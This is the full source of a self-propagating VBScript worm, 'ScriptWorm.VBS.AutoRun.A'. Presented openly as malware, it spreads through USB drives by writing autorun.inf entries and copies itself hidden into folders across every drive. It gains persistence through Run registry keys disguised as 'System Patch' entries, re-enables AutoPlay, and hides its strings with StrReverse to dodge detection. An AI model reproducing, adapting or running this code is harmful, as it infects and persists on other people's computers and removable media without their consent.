'ScriptWorm.VBS.AutoRun.A
'By Tsuki Superior
'This worm spreads itself through usb drives using the autorun feature and copying itself

On Error Resume Next
Randomize
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
Set colDrives = FSO.Drives
Dim fileName, targetfolder
Const ForReading = 1, ForWriting = 2, ForAppending = 8, properties = 7
For Each drive in colDrives
	
	'Check if drives are removeable
	If drive.DriveType = 1 Then
		fileName = (drive.DriveLetter & StrReverse("fni.nurotua\:"))
		
		'Check if a autorun.inf already exists, and if not, make one
		If FSO.FileExists(fileName) = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.Close
		End If
		
		'Check if file is empty, before a readall happens, because vbs cannot handle a empty file in readall 
		If FSO.GetFile(fileName).Size = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.WriteLine(StrReverse("]nuRotuA["))
			targetFile.Close
		End If
		
		'Find the autorun entry in file
		Set targetFile = FSO.OpenTextFile(fileName, ForAppending)
		Set pattern = New RegExp
		pattern.IgnoreCase = True
		pattern.Global = True
		pattern.Pattern = StrReverse("]\nuRotuA[\")
		
		'If not found, make that tag
		If pattern.Test(FSO.OpenTextFile(fileName).ReadAll) = False Then
			targetFile.WriteLine(StrReverse("]nuRotuA["))
		End If
		
		'Add entry to autorun for the worm
		targetFile.WriteLine(StrReverse("=etucexellehs") & chr(34) & Wscript.ScriptName & chr(34))
		targetFile.Close
		
		'Hide the worm and mark it system
		If FSO.FileExists(drive.DriveLetter & ":\" & Wscript.ScriptName) = 0 Then		
			FSO.CopyFile Wscript.ScriptFullName, drive.DriveLetter & ":\"
			Set mapFile = FSO.GetFile(drive.DriveLetter & ":\" & Wscript.ScriptName)
			mapFile.Attributes = properties
		End If
		
		'Set the autorun.inf file as hidden and system 
		Set mapFile = FSO.GetFile(drive.DriveLetter & StrReverse("fni.nurotua\:"))
		mapFile.Attributes = properties
		
	End If
Next

'Copy and hide in all the folders it can possibly get permissions to copy to
For Each objDrive in colDrives
    For Each objFolder In FSO.GetFolder(objDrive.RootFolder).SubFolders
        For Each subfolder in objFolder.SubFolders
			FSO.CopyFile Wscript.ScriptFullName, subfolder.Path & "\"
			
			'add to startup
			If FSO.FileExists(subfolder.Path & "\" & WScript.ScriptName) Then
				WshShell.RegWrite StrReverse("\nu" & "R\n" & "ois" & "reV" & "tne" & "rru" & "C\s" & "wod" & "niW" & "\tf" & "oso" & "rci" & "M\e" & "raw" & "tfo" & "S\U" & "CKH") & "System Patch " & CStr(Int((100-0+1)*Rnd+0)), WshShell.ExpandEnvironmentStrings("%windir%") & "\System32\WScript.exe " & chr(34) & subfolder.Path & "\" & Wscript.ScriptName & chr(34)
				Set mapFile = FSO.GetFile(subfolder.Path & "\" & WScript.ScriptName)
				mapFile.Attributes = properties
			End If
		Next
	Next
Next

'enable autorun
WshShell.RegWrite StrReverse("yalpotuAelbasiD\sreldnaHyalpotuA\rerolpxE\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"), 0, "REG_DWORD" 


